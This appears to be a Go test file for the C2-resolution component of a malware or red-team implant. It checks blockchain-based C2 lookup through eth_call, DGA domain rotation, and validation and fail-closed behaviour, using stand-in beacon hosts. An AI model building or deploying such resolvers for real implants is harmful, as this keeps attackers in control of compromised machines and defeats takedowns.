//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func abiString(s string) string {
	b := make([]byte, 64)
	// offset word = 0x20
	b[31] = 0x20
	length := len(s)
	b[63] = byte(length)
	tail := make([]byte, 0, length+((32-length%32)%32))
	tail = append(tail, []byte(s)...)
	for len(tail)%32 != 0 {
		tail = append(tail, 0)
	}
	b = append(b, tail...)
	return "0x" + hex.EncodeToString(b)
}

func TestParseC2ResolverSpec(t *testing.T) {
	if _, err := parseC2ResolverSpec(""); err == nil {
		t.Fatal("empty spec accepted")
	}
	if _, err := parseC2ResolverSpec("{bad json"); err == nil {
		t.Fatal("malformed json accepted")
	}
	chain := `{"kind":"chain","rpc":"http://insecure","contract":"0x1","data":"0x2"}`
	if _, err := parseC2ResolverSpec(chain); err == nil {
		t.Fatal("non-https chain rpc accepted")
	}
	good, err := parseC2ResolverSpec(`{"kind":"chain","rpc":"https://rpc","contract":"0x1","data":"0x2"}`)
	if err != nil || good.Cap != 4 {
		t.Fatalf("chain default cap = %d err=%v", good.Cap, err)
	}
	dga, err := parseC2ResolverSpec(`{"kind":"dga","seed":"s","tld":"biz","count":9999,"period_minutes":99999}`)
	if err != nil {
		t.Fatal(err)
	}
	// Out-of-range values clamp to the safe defaults, not the max.
	if dga.Count != 128 || dga.PeriodMinutes != 30 {
		t.Fatalf("dga bounds not applied: count=%d period=%d", dga.Count, dga.PeriodMinutes)
	}
	if _, err := parseC2ResolverSpec(`{"kind":"wat"}`); err == nil {
		t.Fatal("unknown kind accepted")
	}
}

func TestDecodeEthCallString(t *testing.T) {
	want := "https://c2.example.com/rpc"
	if got, err := decodeEthCallString(abiString(want)); err != nil || got != want {
		t.Fatalf("decoded = %q err=%v", got, err)
	}
	for _, bad := range []string{
		"0x00",                         // too short
		"not-hex",                      // not hex
		abiString(""),                  // empty payload
		abiString("https://a\x7fb"),    // non-printable control char
		"0x" + strings.Repeat("f", 64), // absurd offset/length
	} {
		if got, err := decodeEthCallString(bad); err == nil {
			t.Fatalf("accepted bad result %q -> %q", bad, got)
		}
	}
}

func TestIsSafeResolvedURL(t *testing.T) {
	for _, u := range []string{"https://a", "http://a/b", " https://x "} {
		if !isSafeResolvedURL(u) {
			t.Fatalf("rejected safe url %q", u)
		}
	}
	for _, u := range []string{"", "ftp://a", "file:///etc", "javascript:x", "//a"} {
		if isSafeResolvedURL(u) {
			t.Fatalf("accepted unsafe url %q", u)
		}
	}
}

func TestDGADeterministicAndBounded(t *testing.T) {
	spec := c2ResolverSpec{Kind: c2ResolverKindDGA, Seed: "sovereign", TLD: "biz", Count: 128, PeriodMinutes: 30}
	now := time.Unix(1_700_000_000, 0)
	a := dgaDomains(spec, now)
	b := dgaDomains(spec, now)
	if len(a) != 128 || strings.Join(a, ",") != strings.Join(b, ",") {
		t.Fatalf("dga not deterministic/bounded: %d domains", len(a))
	}
	seen := map[string]bool{}
	for _, u := range a {
		if seen[u] {
			t.Fatalf("duplicate domain %s", u)
		}
		seen[u] = true
		if !strings.HasSuffix(u, ".biz") || !strings.HasPrefix(u, "https://") {
			t.Fatalf("bad domain %s", u)
		}
	}
	// A different window yields a different ring (rotation).
	c := dgaDomains(spec, now.Add(31*time.Minute))
	if strings.Join(a, ",") == strings.Join(c, ",") {
		t.Fatal("dga did not rotate across window boundary")
	}
}

func TestResolveChainC2OverHTTP(t *testing.T) {
	want := "https://recovered.example.org/beacon"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			t.Errorf("method = %s", r.Method)
		}
		var req jsonRPCRequest
		_ = json.NewDecoder(r.Body).Decode(&req)
		if req.Method != "eth_call" {
			t.Errorf("rpc method = %s", req.Method)
		}
		_ = json.NewEncoder(w).Encode(map[string]string{"result": abiString(want)})
	}))
	defer srv.Close()

	// parseC2ResolverSpec demands https; the httptest server is http, so call
	// resolveChainC2 directly with a spec whose RPC is the local test server.
	spec := c2ResolverSpec{Kind: c2ResolverKindChain, RPC: srv.URL, Contract: "0xabc", Data: "0xdef", Cap: 4}
	urls, err := resolveChainC2(srv.Client(), spec)
	if err != nil || len(urls) != 1 || urls[0] != want {
		t.Fatalf("resolved = %v err=%v", urls, err)
	}

	// Non-200 and RPC errors fail closed.
	errSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadGateway)
	}))
	defer errSrv.Close()
	spec.RPC = errSrv.URL
	if _, err := resolveChainC2(errSrv.Client(), spec); err == nil {
		t.Fatal("non-200 resolver accepted")
	}
	errSrv.Config.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = fmt.Fprint(w, `{"error":{"message":"reverted"}}`)
	})
	if _, err := resolveChainC2(errSrv.Client(), spec); err == nil {
		t.Fatal("rpc error accepted")
	}
}

func TestResolveC2URLsFailClosed(t *testing.T) {
	if urls, err := resolveC2URLs(http.DefaultClient, `{"kind":"wat"}`, time.Now()); err == nil || len(urls) != 0 {
		t.Fatalf("bad spec should fail closed: %v %v", urls, err)
	}
	spec := `{"kind":"dga","seed":"s","tld":"biz","count":8,"period_minutes":30}`
	urls, err := resolveC2URLs(http.DefaultClient, spec, time.Now())
	if err != nil || len(urls) != 8 {
		t.Fatalf("dga resolve = %v err=%v", urls, err)
	}
}
